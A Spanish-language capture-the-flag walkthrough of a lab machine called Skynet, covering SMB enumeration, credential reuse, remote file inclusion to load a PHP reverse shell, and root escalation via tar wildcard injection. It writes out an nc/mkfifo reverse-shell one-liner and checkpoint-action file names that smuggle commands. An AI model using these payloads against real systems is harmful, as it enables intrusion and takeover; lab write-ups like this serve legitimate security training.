# Skynet

# Reconocimientos

Ejecutamos Nmap para enumerar puertos/servicios

```
sudo nmap -sCV -T4 --min-rate 4000 10.10.121.81

Starting Nmap 7.60 ( https://nmap.org ) at 2024-11-08 09:16 GMT
Nmap scan report for ip-10-10-121-81.eu-west-1.compute.internal (10.10.121.81)
Host is up (0.00046s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (EdDSA)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: UIDL TOP PIPELINING RESP-CODES SASL CAPA AUTH-RESP-CODE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LITERAL+ ID LOGIN-REFERRALS OK IDLE ENABLE more IMAP4rev1 Pre-login capabilities have LOGINDISABLEDA0001 SASL-IR listed post-login
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:5E:1E:12:E1:41 (Unknown)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2024-11-08T03:16:39-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-08 09:16:39
|_  start_date: 1600-12-31 23:58:45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.21 seconds
```

Vamos a enumerar primer ode todo el SMB ya que esta disponible parece ser

```
smbclient -L //10.10.121.81
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SKYNET
```

Posteriormente vemos una carpeta "anonymous" vamos a ver si conseguimos algo

```
smbclient //10.10.121.81/anonymous
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Nov 26 16:04:00 2020
  ..                                  D        0  Tue Sep 17 08:20:17 2019
  attention.txt                       N      163  Wed Sep 18 04:04:59 2019
  logs                                D        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5831516 blocks available
smb: \> cd logs
smb: \logs\> dir
  .                                   D        0  Wed Sep 18 05:42:16 2019
  ..                                  D        0  Thu Nov 26 16:04:00 2020
  log2.txt                            N        0  Wed Sep 18 05:42:13 2019
  log1.txt                            N      471  Wed Sep 18 05:41:59 2019
  log3.txt                            N        0  Wed Sep 18 05:42:16 2019

		9204224 blocks of size 1024. 5831516 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (92.0 KiloBytes/sec) (average 92.0 KiloBytes/sec)
smb: \logs\> exit
```

Sacamos los logs, dentro de el nos encontramos bastantes contraseñas, probaremos a conectarnos a la carpeta de milesdyson a ver si encontramos algo. Parece ser que la contraseña no pertece a esto.

Vamos a enumerar la web a ver si encontramos algo

![image](https://github.com/user-attachments/assets/360b99f8-fdce-424c-bccf-ed4df33331da)

Vamos a enumerar subdominios a ver si encontramos algo

```
/admin
/css
/js
/config
/squirrelmail
/ai
```

Parece ser que no tenemos acceso a ningún recurso menos a /squirrelmail

He probado las credenciales miledyson:cyborg007haloterminator y he entrado

![image](https://github.com/user-attachments/assets/33f5af6f-c90f-43b3-9347-096e1c5326f6)

En el primer correo sacamos la pass

![image](https://github.com/user-attachments/assets/4e31103e-4c92-49bf-992d-4564aef99104)

```
smbclient -U milesdyson%')s{A&2Z=F^n_E.B`' //10.10.121.81/milesdyson
```
Dentro del directorio notes nos encontramos un archivo que se llama important.txt

vamos a cogerlo, vaya parece que nos da una ruta interesante: /45kra24zxs28v3yd

![image](https://github.com/user-attachments/assets/6434cfe6-3d3f-4d03-9169-8068cf460ebf)

Como veía que no habia nada en esta ruta he hecho un ffuf

```
/administrator
```

![image](https://github.com/user-attachments/assets/7328b86e-21e7-4ec3-b7ed-33107bcb8619)

Parece ser que este CMS tiene una vulnerabilidad registrada con el archivo COnfigField.php

![image](https://github.com/user-attachments/assets/5f545f65-fa56-4daa-915c-59f5d357c879)

Parece ser un RFI (Remote File Inclusion)

Vamos a leer el lo que pone en el archivo que nos inidica

```
#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.
```

1- Cogemos una rev shell php (pentest monkey)
2- abrimos un servidor (pyhon3 -m http.server)
3- abrimos un netcat (rlwrap nc -lvnp puerto)
4- nos vamos a la URL (http://10.10.121.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.234.153:8000/php.php)

![image](https://github.com/user-attachments/assets/edbb83b2-fb08-4ab0-8763-9208b0967a77)

Estamos dentro !!

Vamos a sacar la primera flag de usuario 

```
/home/milesdyson/user.txt
```

En mi caso voy a upgradear la shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Ya que estamos con esto podemos enumerar para escalar privilegios

# Escalada

Dentro del directorio de milesdyson nos encontramos "backups", dentro del mismo un "backup.sh con permisos de admin"

```
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Encontramos esta url en lo que nos explica la forma de explotar este tipo de vulnerabilidades

https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/

En este caso se utilizan opciones como, chown, tar, rsync etc manifiestos

A nosotros sabremos que es un tar, haciendo una accion especficia despues de la accion del checkpoint puede imputear un shell script que se use para ejectuar comandos arbitrarios, si creamos "ficheros" que hagan comandos arbitrarios:

```
$ cd /var/www/html
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <our-ip> <our-port> > /tmp/f" > shell.sh
$ chmod 777 shell.sh
$ echo "/var/www/html"  > "--checkpoint-action=exec=sh shell.sh"
$ echo "/var/www/html"  > --checkpoint=1
```

![image](https://github.com/user-attachments/assets/c2ecbfce-61b6-456b-a64c-29ac427df089)

GG !!!!

Sacamos la root flag





